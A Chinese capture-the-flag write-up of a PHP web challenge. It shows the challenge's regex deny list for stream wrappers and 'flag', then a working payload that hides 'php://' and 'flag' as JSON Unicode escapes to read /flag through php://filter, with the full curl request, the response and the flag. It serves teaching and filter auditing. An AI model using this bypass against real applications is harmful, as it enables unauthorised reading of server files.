---
title: "[HarekazeCTF2019]encode_and_encode"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [json-unicode-bypass, file-read, php-filter, regex-bypass]
vulnerability: JSON Unicode 转义绕过正则过滤导致任意文件读取
solved: true
flag: "flag{de19e14f-d4b8-4911-afe8-e0c92fcfba80}"
---

# [HarekazeCTF2019]encode_and_encode

## 题目概述
题目提供一个 PHP Web 应用，通过 JSON 参数 `page` 读取文件内容并返回。存在黑名单过滤机制，禁止路径穿越、伪协议和 `flag` 关键词。

## 信息收集
1. 访问首页，发现是一个文件读取功能，通过 POST JSON 数据到 `query.php`
2. 查看 `query.php?source` 获取源码：
```php
function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  // ...
}
```

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：JSON Unicode 转义绕过正则过滤

**原理**：
- `is_valid()` 检查的是原始 JSON 字符串 `$body`
- 但实际使用的是 `json_decode($body, true)` 解码后的 `$json['page']`
- JSON 支持 Unicode 转义序列（如 `\u0070` 表示 `'p'`）
- 原始字符串中的 `\u0070` 不包含 `p` 字符，可绕过正则
- `json_decode()` 会将 `\u0070` 解码为 `'p'`，恢复原始字符串

**判断过程**：
1. 观察到过滤检查在 JSON 解码之前
2. 识别 JSON Unicode 转义特性
3. 构造 `\u0070\u0068\u0070` 绕过 `php:` 过滤
4. 构造 `\u0066\u006c\u0061\u0067` 绕过 `flag` 过滤

## 利用过程（Payload + Flag）

**Payload 构造**：
```
{"page": "\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
```

解码后为：`php://filter/read=convert.base64-encode/resource=/flag`

**完整请求**：
```bash
curl -X POST "http://target/query.php" \
  -H "Content-Type: application/json" \
  -d '{"page": "\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}'
```

**响应**：
```json
{"content":"ZmxhZ3tkZTE5ZTE0Zi1kNGI4LTQ5MTEtYWZlOC1lMGM5MmZjZmJhODB9Cg=="}
```

**Base64 解码**：
```
flag{de19e14f-d4b8-4911-afe8-e0c92fcfba80}
```

## 复现步骤
1. 访问题目 URL
2. 查看 `query.php?source` 获取源码
3. 分析过滤逻辑，发现检查在 JSON 解码前
4. 构造 Unicode 转义的 JSON payload
5. 使用 `php://filter` 伪协议读取 `/flag` 文件
6. Base64 解码获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| JSON Unicode Bypass | `$body` vs `json_decode($body)` | `\u0070\u0068\u0070` 绕过 `php:` | JSON Unicode 转义特性 |
| 任意文件读取 | `file_get_contents($page)` | `php://filter/read=convert.base64-encode` | PHP 伪协议 |

## 知识总结（解题技巧、同类题型套路）

1. **JSON 编码绕过**：当过滤检查在 JSON 解码之前时，可利用 Unicode 转义 `\uXXXX` 绕过关键词过滤
2. **PHP 伪协议**：`php://filter` 可读取文件并进行编码转换，常用于绕过输出过滤
3. **审计要点**：关注数据处理的顺序，检查过滤点与使用点是否一致
4. **同类题型**：任何涉及 JSON 输入且过滤检查在解码前的场景都存在此漏洞
